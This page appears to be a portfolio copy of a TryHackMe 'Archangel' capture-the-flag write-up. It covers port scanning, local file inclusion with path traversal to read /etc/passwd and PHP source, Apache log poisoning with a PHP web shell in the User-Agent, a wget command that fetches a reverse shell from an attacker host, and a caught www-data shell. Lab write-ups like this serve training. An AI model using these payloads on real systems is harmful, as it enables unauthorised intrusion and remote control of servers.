<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Archangel | Technical Intelligence Labs</title>
    <link rel="stylesheet" href="../css/custom.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 100%; margin: 0 auto; }
        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; font-family: 'JetBrains Mono', monospace; }
        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; font-family: 'JetBrains Mono', monospace; }
        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; }
        .markdown-content blockquote { 
            position: relative;
            border-left: 2px solid #22c55e; 
            padding: 1.5rem 0 1.5rem 1.75rem; 
            color: #cbd5e1; 
            margin-bottom: 2.5rem; 
            font-style: normal; 
            background: rgba(34, 197, 94, 0.03);
            border-radius: 0 4px 4px 0;
            box-shadow: inset 20px 0 20px -20px rgba(34, 197, 94, 0.15);
        }
        .markdown-content blockquote::before {
            content: "TECHNICAL_INTELLIGENCE";
            position: absolute;
            top: -9px;
            left: 12px;
            background: #0f172a;
            padding: 0 10px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 9px;
            color: #22c55e;
            letter-spacing: 2px;
            border: 1px solid rgba(34, 197, 94, 0.4);
            font-weight: 700;
            z-index: 10;
        }
        .nav-index { color: #22c55e; opacity: 0.5; margin-right: 0.5rem; font-weight: bold; }
        .diag-card { background: rgba(15, 23, 42, 0.5); border: 1px solid rgba(255, 255, 255, 0.05); padding: 1rem; font-family: 'JetBrains Mono', monospace; font-size: 10px; color: #64748b; border-radius: 4px; }
        .diag-label { color: #94a3b8; text-transform: uppercase; margin-bottom: 4px; display: block; font-size: 8px; letter-spacing: 1px; }
        .diag-value { color: #22c55e; }
        .diag-blink { animation: blink 1s step-end infinite; }
        @keyframes blink { 50% { opacity: 0; } }
        body { 
            background-image: 
                linear-gradient(to bottom, rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.95)),
                url('../images/world-map-bg.png');
            background-attachment: fixed;
            background-size: cover;
            background-position: center;
            color: #cbd5e1; 
        }
    </style>
</head>
<body class="p-8 md:p-16 bg-transparent selection:bg-accent-green selection:text-slate-900">
    <nav class="mb-12 font-mono text-sm">
        <a href="../index.html" class="text-accent-cyan hover:underline hover:text-white transition-colors">Return_to_Portfolio</a>
    </nav>
    <article class="max-w-7xl mx-auto">
        <header class="mb-12">
            <div class="text-accent-green font-mono text-sm mb-2 uppercase">tryhackme</div>
            <h1 class="text-4xl md:text-5xl font-bold text-white mb-4">Archangel</h1>
            <div class="text-slate-500 text-sm">2024-12-30 • tryhackme, ctf</div>
        </header>
        <div class="markdown-content">
            <div class="codehilite"><pre><span></span><code><span class="nt">PORT</span><span class="w">   </span><span class="nt">STATE</span><span class="w"> </span><span class="nt">SERVICE</span><span class="w"> </span><span class="nt">REASON</span><span class="w">         </span><span class="nt">VERSION</span>
<span class="nt">22</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">open</span><span class="w">  </span><span class="nt">ssh</span><span class="w">     </span><span class="nt">syn-ack</span><span class="w"> </span><span class="nt">ttl</span><span class="w"> </span><span class="nt">62</span><span class="w"> </span><span class="nt">OpenSSH</span><span class="w"> </span><span class="nt">7</span><span class="p">.</span><span class="nc">6p1</span><span class="w"> </span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">4ubuntu0</span><span class="p">.</span><span class="nc">3</span><span class="w"> </span><span class="o">(</span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">Linux</span><span class="o">;</span><span class="w"> </span><span class="nt">protocol</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="o">)</span>
<span class="o">|</span><span class="w"> </span><span class="nt">ssh-hostkey</span><span class="o">:</span><span class="w"> </span>
<span class="o">|</span><span class="w">   </span><span class="nt">2048</span><span class="w"> </span><span class="nt">9f</span><span class="p">:</span><span class="nd">1d</span><span class="p">:</span><span class="nd">2c</span><span class="p">:</span><span class="nd">9d</span><span class="p">:</span><span class="nd">6c</span><span class="p">:</span><span class="nd">a4</span><span class="p">:</span><span class="nd">0e</span><span class="p">:</span><span class="nd">46</span><span class="p">:</span><span class="nd">40</span><span class="p">:</span><span class="nd">50</span><span class="p">:</span><span class="nd">6f</span><span class="p">:</span><span class="nd">ed</span><span class="p">:</span><span class="nd">cf</span><span class="p">:</span><span class="nd">1c</span><span class="p">:</span><span class="nd">f3</span><span class="p">:</span><span class="nd">8c</span><span class="w"> </span><span class="o">(</span><span class="nt">RSA</span><span class="o">)</span>
<span class="o">|</span><span class="w"> </span><span class="nt">ssh-rsa</span><span class="w"> </span><span class="nt">AAAAB3NzaC1yc2EAAAADAQABAAABAQDPrwb4vLZ</span><span class="o">/</span><span class="nt">CJqefgxZMUh3zsubjXMLrKYpP8Oy5jNSRaZynNICWMQNfcuLZ2GZbR84iEQJrNqCFcbsgD</span><span class="o">+</span><span class="nt">4OPyy0TXV1biJExck3OlriDBn3g9trxh6qcHTBKoUMM3CnEJtuaZ1ZPmmebbRGyrG03jzIow</span><span class="o">+</span><span class="nt">w2updsJ3C0nkUxdSQ7FaNxwYOZ5S3X5XdLw2RXu</span><span class="o">/</span><span class="nt">o130fs6qmFYYTm2qii6Ilf5EkyffeYRc8SbPpZKoEpT7TQ08VYEICier9ND408kGERHinsVtBDkaCec3XmWXkFsOJUdW4BYVhrD3M8JBvL1kPmReOnx8Q7JX2JpGDenXNOjEBS3BIX2vjj17Qo3V</span>
<span class="o">|</span><span class="w">   </span><span class="nt">256</span><span class="w"> </span><span class="nt">63</span><span class="p">:</span><span class="nd">73</span><span class="p">:</span><span class="nd">27</span><span class="p">:</span><span class="nd">c7</span><span class="p">:</span><span class="nd">61</span><span class="p">:</span><span class="nd">04</span><span class="p">:</span><span class="nd">25</span><span class="p">:</span><span class="nd">6a</span><span class="p">:</span><span class="nd">08</span><span class="p">:</span><span class="nd">70</span><span class="p">:</span><span class="nd">7a</span><span class="p">:</span><span class="nd">36</span><span class="p">:</span><span class="nd">b2</span><span class="p">:</span><span class="nd">f2</span><span class="p">:</span><span class="nd">84</span><span class="p">:</span><span class="nd">0d</span><span class="w"> </span><span class="o">(</span><span class="nt">ECDSA</span><span class="o">)</span>
<span class="o">|</span><span class="w"> </span><span class="nt">ecdsa-sha2-nistp256</span><span class="w"> </span><span class="nt">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKhhd</span><span class="o">/</span><span class="nt">akQ2OLPa2ogtMy7V</span><span class="o">/</span><span class="nt">GEqDyDz8IZZQ</span><span class="o">+</span><span class="nt">266QEHke6vdC9papydu1wlbdtMVdOPx1S6zxA4CzyrcIwDQSiCg</span><span class="o">=</span>
<span class="o">|</span><span class="w">   </span><span class="nt">256</span><span class="w"> </span><span class="nt">b6</span><span class="p">:</span><span class="nd">4e</span><span class="p">:</span><span class="nd">d2</span><span class="p">:</span><span class="nd">9c</span><span class="p">:</span><span class="nd">37</span><span class="p">:</span><span class="nd">85</span><span class="p">:</span><span class="nd">d6</span><span class="p">:</span><span class="nd">76</span><span class="p">:</span><span class="nd">53</span><span class="p">:</span><span class="nd">e8</span><span class="p">:</span><span class="nd">c4</span><span class="p">:</span><span class="nd">e0</span><span class="p">:</span><span class="nd">48</span><span class="p">:</span><span class="nd">1c</span><span class="p">:</span><span class="nd">ae</span><span class="p">:</span><span class="nd">6c</span><span class="w"> </span><span class="o">(</span><span class="nt">ED25519</span><span class="o">)</span>
<span class="o">|</span><span class="nt">_ssh-ed25519</span><span class="w"> </span><span class="nt">AAAAC3NzaC1lZDI1NTE5AAAAIBE3FV9PrmRlGbT2XSUjGvDjlWoA</span><span class="o">/</span><span class="nt">7nPoHjcCXLer12O</span>
<span class="nt">80</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">open</span><span class="w">  </span><span class="nt">http</span><span class="w">    </span><span class="nt">syn-ack</span><span class="w"> </span><span class="nt">ttl</span><span class="w"> </span><span class="nt">62</span><span class="w"> </span><span class="nt">Apache</span><span class="w"> </span><span class="nt">httpd</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">29</span><span class="w"> </span><span class="o">((</span><span class="nt">Ubuntu</span><span class="o">))</span>
<span class="o">|</span><span class="nt">_http-server-header</span><span class="o">:</span><span class="w"> </span><span class="nt">Apache</span><span class="o">/</span><span class="nt">2</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">29</span><span class="w"> </span><span class="o">(</span><span class="nt">Ubuntu</span><span class="o">)</span>
<span class="o">|</span><span class="nt">_http-title</span><span class="o">:</span><span class="w"> </span><span class="nt">Wavefire</span>
<span class="o">|</span><span class="w"> </span><span class="nt">http-methods</span><span class="o">:</span><span class="w"> </span>
<span class="o">|</span><span class="nt">_</span><span class="w">  </span><span class="nt">Supported</span><span class="w"> </span><span class="nt">Methods</span><span class="o">:</span><span class="w"> </span><span class="nt">GET</span><span class="w"> </span><span class="nt">HEAD</span><span class="w"> </span><span class="nt">POST</span><span class="w"> </span><span class="nt">OPTIONS</span>
<span class="nt">Service</span><span class="w"> </span><span class="nt">Info</span><span class="o">:</span><span class="w"> </span><span class="nt">OS</span><span class="o">:</span><span class="w"> </span><span class="nt">Linux</span><span class="o">;</span><span class="w"> </span><span class="nt">CPE</span><span class="o">:</span><span class="w"> </span><span class="nt">cpe</span><span class="o">:/</span><span class="nt">o</span><span class="p">:</span><span class="nd">linux</span><span class="p">:</span><span class="nd">linux_kernel</span>
</code></pre></div>

<blockquote>
<p>look at mail option  and you find another domain now add  that to /etc/hosts now I can see that website is under development so I fuzz</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="o">===============================================================</span>
<span class="n">Starting</span><span class="w"> </span><span class="n">gobuster</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="n">enumeration</span><span class="w"> </span><span class="n">mode</span>
<span class="o">===============================================================</span>
<span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">html</span><span class="w">           </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">200</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="n">Size</span><span class="p">:</span><span class="w"> </span><span class="mi">59</span><span class="p">]</span>
<span class="o">/</span><span class="n">test</span><span class="o">.</span><span class="n">php</span><span class="w">             </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span><span class="w"> </span><span class="mi">200</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="n">Size</span><span class="p">:</span><span class="w"> </span><span class="mi">286</span><span class="p">]</span>
</code></pre></div>

<blockquote>
<p><code>http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php</code></p>
<p><code>http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php</code></p>
</blockquote>
<div class="codehilite"><pre><span></span><code>└─$ echo &quot;CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg== &quot; | base64 -d

<span class="cp">&lt;!DOCTYPE HTML&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>

<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>INCLUDE<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Test Page. Not to be Deployed<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>

    <span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/test.php?view=/var/www/html/development_testing/mrrobot.php&quot;</span><span class="p">&gt;&lt;</span><span class="nt">button</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;secret&quot;</span><span class="p">&gt;</span>Here is a button<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
        <span class="cp">&lt;?php</span>

        <span class="c1">//FLAG: thm{explo1t1ng_lf1}</span>

            <span class="k">function</span> <span class="nf">containsStr</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$substr</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$substr</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;view&quot;</span><span class="p">])){</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">containsStr</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;view&#39;</span><span class="p">],</span> <span class="s1">&#39;../..&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">containsStr</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;view&#39;</span><span class="p">],</span> <span class="s1">&#39;/var/www/html/development_testing&#39;</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">include</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;view&#39;</span><span class="p">];</span>
            <span class="p">}</span><span class="k">else</span><span class="p">{</span>

        <span class="k">echo</span> <span class="s1">&#39;Sorry, Thats not allowed&#39;</span><span class="p">;</span>
            <span class="p">}</span>
    <span class="p">}</span>
        <span class="cp">?&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>

<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>


base64: invalid input
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/test.php?view=/var/www/html/development_testing/..//..//..//..//..//etc/passwd</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="w">        </span><span class="nt">&lt;/button&gt;&lt;/a&gt;</span><span class="w"> </span><span class="nt">&lt;a</span><span class="w"> </span><span class="na">href=</span><span class="s">&quot;/test.php?view=/var/www/html/development_testing/mrrobot.php&quot;</span><span class="nt">&gt;&lt;button</span><span class="w"> </span><span class="na">id=</span><span class="s">&quot;secret&quot;</span><span class="nt">&gt;</span>Here<span class="w"> </span>is<span class="w"> </span>a<span class="w"> </span>button<span class="nt">&lt;/button&gt;&lt;/a&gt;&lt;br&gt;</span>
<span class="w">        </span>root:x:0:0:root:/root:/bin/bash
<span class="w">        </span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
<span class="w">        </span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
<span class="w">        </span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
<span class="w">        </span>sync:x:4:65534:sync:/bin:/bin/sync
<span class="w">        </span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
<span class="w">        </span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
<span class="w">        </span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
<span class="w">        </span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
<span class="w">        </span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
<span class="w">        </span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
<span class="w">        </span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
<span class="w">        </span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
<span class="w">        </span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
<span class="w">        </span>list:x:38:38:Mailing<span class="w"> </span>List<span class="w"> </span>Manager:/var/list:/usr/sbin/nologin
<span class="w">        </span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
<span class="w">        </span>gnats:x:41:41:Gnats<span class="w"> </span>Bug-Reporting<span class="w"> </span>System<span class="w"> </span>(admin):/var/lib/gnats:/usr/sbin/nologin
<span class="w">        </span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
<span class="w">        </span>systemd-network:x:100:102:systemd<span class="w"> </span>Network<span class="w"> </span>Management,,,:/run/systemd/netif:/usr/sbin/nologin
<span class="w">        </span>systemd-resolve:x:101:103:systemd<span class="w"> </span>Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
<span class="w">        </span>syslog:x:102:106::/home/syslog:/usr/sbin/nologin
<span class="w">        </span>messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
<span class="w">        </span>_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
<span class="w">        </span>uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
<span class="w">        </span>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
<span class="w">        </span>archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
<span class="w">        </span><span class="nt">&lt;/div&gt;</span>
<span class="w">        </span><span class="nt">&lt;/body&gt;</span>
</code></pre></div>

<blockquote>
<p>The users<br />
<code>root</code> <code>archangel</code></p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="n">test</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">view</span><span class="o">=/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">development_testing</span><span class="o">/..//..//..//..///</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">access</span><span class="o">.</span><span class="n">log</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code> curl http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..///var/log/apache2/access.log

<span class="cp">&lt;!DOCTYPE HTML&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>

<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>INCLUDE<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Test Page. Not to be Deployed<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>

    <span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/test.php?view=/var/www/html/development_testing/mrrobot.php&quot;</span><span class="p">&gt;&lt;</span><span class="nt">button</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;secret&quot;</span><span class="p">&gt;</span>Here is a button<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>

192.168.153.193 - - [05/Dec/2025:18:20:50 +0530] &quot;GET / HTTP/1.0&quot; 200 19462 &quot;-&quot; &quot;-&quot;
192.168.153.193 - - [05/Dec/2025:18:20:51 +0530] &quot;GET / HTTP/1.1&quot; 200 19462 &quot;-&quot; &quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;
192.168.153.193 - - [05/Dec/2025:18:20:51 +0530] &quot;PROPFIND / HTTP/1.1&quot; 405 523 &quot;-&quot; &quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;
192.168.153.193 - - [05/Dec/2025:18:20:51 +0530] &quot;OPTIONS / HTTP/1.1&quot; 200 181 &quot;-&quot; &quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;
192.168.153.193 - - [05/Dec/2025:18:20:51 +0530] &quot;PROPFIND / HTTP/1.1&quot; 405 523 &quot;-&quot; &quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html
</code></pre></div>

<blockquote>
<p>log poison into user agent <code>&lt;?php system($_GET['cmd']); ?&gt;</code> I use caido</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="n">Host</span><span class="o">:</span><span class="w"> </span><span class="n">mafialive</span><span class="o">.</span><span class="na">thm</span>
<span class="n">Cache</span><span class="o">-</span><span class="n">Control</span><span class="o">:</span><span class="w"> </span><span class="n">max</span><span class="o">-</span><span class="n">age</span><span class="o">=</span><span class="mi">0</span>
<span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="o">:</span><span class="w"> </span><span class="mi">1</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="o">:</span><span class="w"> </span><span class="o">&lt;?</span><span class="n">php</span><span class="w"> </span><span class="n">system</span><span class="o">(</span><span class="n">$_GET</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">]);</span><span class="w"> </span><span class="o">?&gt;</span>
<span class="n">Accept</span><span class="o">:</span><span class="w"> </span><span class="n">text</span><span class="sr">/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/sig</span><span class="n">ned</span><span class="o">-</span><span class="n">exchange</span><span class="o">;</span><span class="n">v</span><span class="o">=</span><span class="n">b3</span><span class="o">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.7</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="o">:</span><span class="w"> </span><span class="n">gzip</span><span class="o">,</span><span class="w"> </span><span class="n">deflate</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="o">:</span><span class="w"> </span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="o">,</span><span class="n">en</span><span class="o">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span>
</code></pre></div>

<blockquote>
<p>upload revshell into target machine</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="n">test</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">view</span><span class="o">=/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">development_testing</span><span class="o">/..//..//..//..///</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">access</span><span class="o">.</span><span class="n">log</span><span class="o">&amp;</span><span class="n">wget</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">attackerip</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="n">revshell</span><span class="o">.</span><span class="n">php</span>
</code></pre></div>

<blockquote>
<p>in this situation have to encode url because cant keep space in url so add <code>%20</code></p>
</blockquote>
<div class="codehilite"><pre><span></span><code>&amp;wget%20http://attackerip:80/revshell.php
</code></pre></div>

<blockquote>
<p>so now excute php file to get shell</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/test.php?view=/var/www/html/development_testing//..//..//..//log/apache2/access.log&amp;cmd=php%20php-reverse-shell.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">mafialive.thm</span>
<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.9</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lnvp</span><span class="w"> </span><span class="mi">9001</span>
<span class="n">listening</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="p">[</span><span class="nb">any</span><span class="p">]</span><span class="w"> </span><span class="mi">9001</span><span class="w"> </span><span class="o">...</span>
<span class="n">connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="p">[</span><span class="mf">192.168.153.193</span><span class="p">]</span><span class="w"> </span><span class="kn">from</span><span class="w"> </span><span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="mf">10.66.188.232</span><span class="p">]</span><span class="w"> </span><span class="mi">44962</span>
<span class="n">Linux</span><span class="w"> </span><span class="n">ubuntu</span><span class="w"> </span><span class="mf">4.15.0</span><span class="o">-</span><span class="mi">123</span><span class="o">-</span><span class="n">generic</span><span class="w"> </span><span class="c1">#126-Ubuntu SMP Wed Oct 21 09:40:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
<span class="w"> </span><span class="mi">20</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mi">37</span><span class="w"> </span><span class="n">up</span><span class="w">  </span><span class="mi">2</span><span class="p">:</span><span class="mi">20</span><span class="p">,</span><span class="w">  </span><span class="mi">0</span><span class="w"> </span><span class="n">users</span><span class="p">,</span><span class="w">  </span><span class="n">load</span><span class="w"> </span><span class="n">average</span><span class="p">:</span><span class="w"> </span><span class="mf">0.00</span><span class="p">,</span><span class="w"> </span><span class="mf">0.00</span><span class="p">,</span><span class="w"> </span><span class="mf">0.00</span>
<span class="n">USER</span><span class="w">     </span><span class="n">TTY</span><span class="w">      </span><span class="n">FROM</span><span class="w">             </span><span class="n">LOGIN</span><span class="o">@</span><span class="w">   </span><span class="n">IDLE</span><span class="w">   </span><span class="n">JCPU</span><span class="w">   </span><span class="n">PCPU</span><span class="w"> </span><span class="n">WHAT</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span>
<span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">:</span><span class="w"> </span><span class="n">can</span><span class="s1">&#39;t access tty; job control turned off</span>
<span class="err">$</span><span class="w"> </span><span class="n">whoami</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span>
<span class="err">$</span><span class="w"> </span><span class="nb">id</span>
